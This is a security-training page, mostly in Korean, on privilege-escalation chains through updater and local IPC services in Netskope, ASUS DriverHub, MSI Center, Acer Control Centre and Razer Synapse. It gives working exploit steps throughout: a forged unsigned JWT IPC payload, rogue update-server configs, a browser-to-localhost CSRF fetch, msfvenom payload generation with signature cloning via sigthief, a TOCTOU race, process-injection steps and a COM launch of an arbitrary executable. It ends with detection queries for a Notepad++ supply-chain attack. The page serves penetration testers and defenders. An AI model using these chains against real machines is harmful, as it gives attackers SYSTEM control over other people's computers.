# 기업용 자동 업데이트 및 권한 있는 IPC 악용 (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 낮은 마찰의 IPC 표면과 권한 있는 업데이트 플로우를 노출하는 엔터프라이즈 엔드포인트 에이전트 및 업데이터에서 발견되는 Windows local privilege escalation 체인을 일반화한 것이다. 대표적인 예로 Netskope Client for Windows < R129 (CVE-2025-0309)가 있는데, 여기서 권한이 낮은 사용자가 공격자 제어 서버로의 등록을 강제한 뒤 SYSTEM 서비스가 설치하는 악성 MSI를 배포할 수 있다.

재사용 가능한 핵심 아이디어:
- 권한 있는 서비스의 localhost IPC를 악용해 재등록 또는 재구성을 공격자 서버로 강제한다.
- 벤더의 update endpoints를 구현하고, 악성 Trusted Root CA를 심은 뒤 updater를 악의적인 “signed” 패키지로 가리킨다.
- 약한 signer 검사(CN allow-lists), 선택적 digest 플래그, 느슨한 MSI 속성을 회피한다.
- IPC가 “encrypted”되어 있으면 registry에 저장된 전 세계에서 읽을 수 있는 머신 식별자에서 key/IV를 유도한다.
- 서비스가 image path/process name으로 호출자를 제한하면 allow-listed 프로세스에 인젝션하거나 프로세스를 suspended 상태로 생성해 최소한의 thread-context patch로 DLL을 부트스트랩한다.

---
## 1) localhost IPC를 통해 공격자 서버로 등록을 강제하기

많은 에이전트는 사용자 모드 UI 프로세스를 제공하며, 이 프로세스는 localhost TCP를 통해 JSON을 사용하여 SYSTEM 서비스와 통신한다.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) 백엔드 호스트(예: AddonUrl)를 제어하는 클레임을 포함한 JWT enrollment token을 생성한다. 서명이 필요 없도록 alg=None을 사용한다.
2) JWT와 tenant name을 포함해 provisioning 명령을 호출하는 IPC 메시지를 보낸다:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 서비스가 등록/구성(enrollment/config)을 위해 악성 서버로 요청을 보내기 시작한다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) 업데이트 채널 Hijacking하여 SYSTEM 권한으로 코드 실행

클라이언트가 서버와 통신하면, 예상되는 엔드포인트를 구현하고 이를 공격자 MSI로 유도하라. 일반적인 순서:

1) /v2/config/org/clientconfig → 매우 짧은 업데이트 간격을 가진 JSON config를 반환, 예:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. 서비스는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 위조된 버전을 가리키는 메타데이터를 제공합니다.

야외에서 관찰되는 일반적인 검사 우회 방법:
- Signer CN allow-list: 서비스가 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”인지 여부만 검사할 수 있습니다. 귀하의 rogue CA는 해당 CN으로 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 이름의 무해한 MSI property를 포함합니다. 설치 시 강제되지 않습니다.
- Optional digest enforcement: config 플래그(예: check_msi_digest=false)가 추가 암호화 검증을 비활성화합니다.

결과: SYSTEM 서비스가 C:\ProgramData\Netskope\stAgent\data\*.msi에서 귀하의 MSI를 설치하여 NT AUTHORITY\SYSTEM으로 임의 코드를 실행합니다.

---
## 3) Forging encrypted IPC requests (when present)

R127부터 Netskope는 IPC JSON을 encryptData 필드에 Base64처럼 보이게 래핑했습니다. 리버싱 결과 AES가 레지스트리 값에서 파생된 key/IV로 사용되는 것이 확인되었고, 해당 값들은 일반 사용자도 읽을 수 있습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화 과정을 재현해 일반 사용자 권한에서 유효한 암호화된 명령을 보낼 수 있습니다. 일반적인 팁: 에이전트가 갑자기 “encrypts”된 IPC를 사용하면, HKLM 아래의 device IDs, product GUIDs, install IDs 등을 암호화 재료로 찾아보세요.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

일부 서비스는 TCP 연결의 PID를 확인하고 이미지 path/name을 Program Files 아래의 allow-listed 벤더 바이너리(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교해 피어를 인증하려 합니다.

실용적인 우회 방법 두 가지:
- allow-listed 프로세스(예: nsdiag.exe)에 DLL injection을 하고 내부에서 IPC를 프록시합니다.
- allow-listed 바이너리를 CREATE_SUSPENDED로 띄우고 CreateRemoteThread 없이 프록시 DLL을 부트스트랩해 드라이버가 강제하는 변조 규칙을 충족시킵니다(§5 참조).

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

제품들은 종종 보호된 프로세스의 핸들에서 위험 권한을 제거하는 minifilter/OB callbacks 드라이버(예: Stadrv)를 동봉합니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME를 제거
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한

이 제약을 준수하는 신뢰할 수 있는 user-mode 로더:
1) 벤더 바이너리를 CREATE_SUSPENDED로 CreateProcess 합니다.
2) 여전히 얻을 수 있는 핸들들: 프로세스에 대해 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 스레드에 대해 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP에서 코드를 패치할 경우 THREAD_RESUME만) 핸들을 획득합니다.
3) ntdll!NtContinue(또는 다른 초기에 항상 매핑되는 thunk)를 덮어쓰고, 귀하의 DLL 경로로 LoadLibraryW를 호출한 뒤 되돌아오는 작은 스텁을 넣습니다.
4) ResumeThread로 인프로세스에서 스텁을 트리거해 DLL을 로드합니다.

이미 보호된 프로세스에서 PROCESS_CREATE_THREAD나 PROCESS_SUSPEND_RESUME를 사용한 적이 없고(직접 생성했기 때문에) 드라이버 정책을 만족합니다.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin)은 rogue CA, 악성 MSI 서명 자동화 및 다음 엔드포인트 제공을 지원합니다: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope는 임의의(선택적으로 AES-encrypted) IPC 메시지를 제작하고, allow-listed 바이너리에서 시작되도록 suspended-process injection을 포함한 맞춤 IPC 클라이언트입니다.

## 7) Fast triage workflow for unknown updater/IPC surfaces

새로운 endpoint agent나 마더보드 “helper” 스위트를 마주했을 때, 빠른 워크플로우로 해당 대상이 유망한 privesc 타깃인지 여부를 판단할 수 있습니다:

1) loopback 리스너를 열거하고 이를 벤더 프로세스에 매핑합니다:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 후보 named pipes 열거:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) 플러그인 기반 IPC 서버에서 사용하는 레지스트리 기반 라우팅 데이터를 수집:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 먼저 user-mode client에서 endpoint names, JSON keys, 그리고 command IDs를 추출합니다. Packed Electron/.NET frontends는 전체 스키마를 자주 leak합니다:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) 권한 있는 HTTP APIs를 대상으로 한 Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 user-mode HTTP 서비스(ADU.exe)를 제공하며, 브라우저 요청이 https://driverhub.asus.com에서 오는 것으로 기대한다. Origin 필터는 Origin 헤더와 `/asus/v1.0/*`로 노출된 다운로드 URL에 대해 단순히 `string_contains(".asus.com")`를 수행한다. 따라서 `https://driverhub.asus.com.attacker.tld`와 같은 공격자 제어 호스트는 해당 검사를 통과하여 JavaScript에서 상태 변경 요청을 보낼 수 있다. 추가 우회 패턴은 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참조하라.

Practical flow:
1) `.asus.com`을 포함하는 도메인을 등록하고 그곳에 악성 웹페이지를 호스팅한다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 권한 있는 엔드포인트(예: `Reboot`, `UpdateApp`)를 호출한다.
3) 핸들러가 예상하는 JSON 바디를 전송한다 – 패킹된 frontend JS가 아래에 스키마를 보여준다.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
아래에 표시된 PowerShell CLI도 Origin header가 신뢰된 값으로 spoofed될 때 성공합니다:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
따라서 공격자 사이트로의 모든 브라우저 방문은 1-클릭(또는 `onload`를 통한 0-클릭) 로컬 CSRF가 되어 SYSTEM 헬퍼를 실행시킨다.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`는 JSON 본문에 정의된 임의의 실행 파일을 다운로드하여 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 캐시한다. 다운로드 URL 검증은 동일한 substring 로직을 재사용하므로 `http://updates.asus.com.attacker.tld:8000/payload.exe`도 허용된다. 다운로드 후 ADU.exe는 PE에 서명이 포함되어 있고 Subject 문자열이 ASUS와 일치하는지만 확인한 뒤 실행한다 – `WinVerifyTrust`나 체인 검증은 없다.

공격에 이용하려면:
1) 페이로드 생성(예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 서명자를 복제하여 삽입(예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `.asus.com`을 모방한 도메인에 `pwn.exe`를 호스팅하고, 위 브라우저 CSRF로 UpdateApp을 트리거한다.

Origin 및 URL 필터가 모두 substring 기반이고 서명자 검사가 문자열 비교만 수행하므로 DriverHub는 공격자 바이너리를 가져와 상승된 컨텍스트에서 실행한다.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM 서비스는 각 프레임이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`인 TCP 프로토콜을 노출한다. 핵심 컴포넌트(Component ID `0f 27 00 00`)는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`를 제공한다. 해당 핸들러는:
1) 제공된 실행 파일을 `C:\Windows\Temp\MSI Center SDK.exe`로 복사한다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 서명을 검증한다(인증서 subject는 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치해야 하고 `WinVerifyTrust`가 성공해야 함).
3) 임시 파일을 SYSTEM으로 공격자가 제어하는 인수와 함께 실행하는 예약 작업을 생성한다.

복사된 파일은 검증과 `ExecuteTask()` 사이에 잠금이 걸리지 않는다. 공격자는:
- 서명이 유효한 MSI 바이너리를 가리키는 Frame A를 보내서(서명 확인이 통과되고 작업이 큐에 쌓이도록 보장).
- 검증 직후 `MSI Center SDK.exe`를 덮어쓰도록 악성 페이로드를 가리키는 Frame B를 반복 전송하며 경합(race)을 건다.

스케줄러가 실행되면 원본 파일을 검증했음에도 불구하고 덮어써진 페이로드를 SYSTEM 권한으로 실행한다. 신뢰할 수 있는 익스플로잇은 두 개의 goroutine/스레드를 사용해 CMD_AutoUpdateSDK를 스팸하여 TOCTOU 창을 확보할 때까지 반복한다.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe`에 의해 로드되는 모든 플러그인/DLL은 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID를 받는다. 프레임의 처음 4바이트가 해당 컴포넌트를 선택하여 공격자가 명령을 임의의 모듈로 라우팅할 수 있게 한다.
- 플러그인은 자체 작업 러너를 정의할 수 있다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`를 노출하고 `API_Support.EX_Task::ExecuteTask()`를 직접 호출하여 **no signature validation** – 로컬 사용자는 누구나 이를 `C:\Users\<user>\Desktop\payload.exe`를 가리키게 하여 결정론적으로 SYSTEM 실행을 얻을 수 있다.
- Wireshark로 루프백을 스니핑하거나 dnSpy로 .NET 바이너리를 계측하면 Component ↔ command 매핑이 빠르게 드러난다; 그 후 커스텀 Go/ Python 클라이언트로 프레임을 재생할 수 있다.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM)는 `\\.\pipe\treadstone_service_LightMode`를 노출하며, 그 discretionary ACL은 원격 클라이언트(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용한다. 파일 경로와 함께 명령 ID `7`을 보내면 서비스의 프로세스 생성 루틴이 호출된다.
- 클라이언트 라이브러리는 인자들과 함께 매직 종결자 바이트(113)를 직렬화한다. Frida/`TsDotNetLib`로 동적 계측(계측 팁은 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) 참조)을 하면 네이티브 핸들러가 이 값을 `SECURITY_IMPERSONATION_LEVEL`과 무결성 SID로 매핑한 뒤 `CreateProcessAsUser`를 호출함을 보여준다.
- 113 (`0x71`)을 114 (`0x72`)로 바꾸면 전체 SYSTEM 토큰을 유지하고 높은 무결성 SID(`S-1-16-12288`)를 설정하는 일반 분기로 들어간다. 따라서 생성된 바이너리는 로컬과 크로스 머신 모두에서 제약 없는 SYSTEM으로 실행된다.
- 이를 노출된 설치기 플래그(`Setup.exe -nocheck`)와 결합하면 실험실 VM에서도 ACC를 설치해 벤더 하드웨어 없이도 파이프를 테스트할 수 있다.

이러한 IPC 버그는 로컬호스트 서비스가 상호 인증(ALPC SIDs, `ImpersonationLevel=Impersonation` 필터, 토큰 필터링)을 강제해야 하는 이유와 모든 모듈의 “run arbitrary binary” 헬퍼가 동일한 서명자 검증을 공유해야 하는 이유를 강조한다.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4은 이 계열에 또 다른 유용한 패턴을 추가했다: 권한이 낮은 사용자가 `RzUtility.Elevator`를 통해 COM 헬퍼에 프로세스 실행을 요청할 수 있으며, 신뢰 결정이 권한 경계 내부에서 엄격하게 강제되지 않고 user-mode DLL(`simple_service.dll`)에 위임된다.

관찰된 익스플로잇 경로:
- COM 객체 `RzUtility.Elevator`를 인스턴스화한다.
- `LaunchProcessNoWait(<path>, "", 1)`를 호출해 상승된 실행을 요청한다.
- 공개 PoC에서는 요청을 보내기 전에 `simple_service.dll` 내부의 PE 서명 체크가 패치되어 임의의 공격자 선택 실행 파일이 실행되도록 허용한다.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

이전의 WinGUp 기반 Notepad++ updaters는 업데이트의 정당성을 완전히 검증하지 않았다. 공격자가 업데이트 서버의 호스팅 공급자를 침해하면 XML 매니페스트를 변조하고 선택된 클라이언트만 공격자 URL로 리다이렉트할 수 있었다. 클라이언트가 신뢰할 수 있는 인증서 체인과 유효한 PE 서명을 모두 강제하지 않고 어떤 HTTPS 응답도 수용했기 때문에, 피해자들은 trojanized NSIS `update.exe`를 가져와 실행했다.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

이러한 패턴은 unsigned manifests를 허용하거나 installer signers를 고정(pin)하지 못하는 모든 updater에 일반화된다—network hijack + malicious installer + BYO-signed sideloading은 “trusted” updates라는 명목으로 remote code execution을 초래한다.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
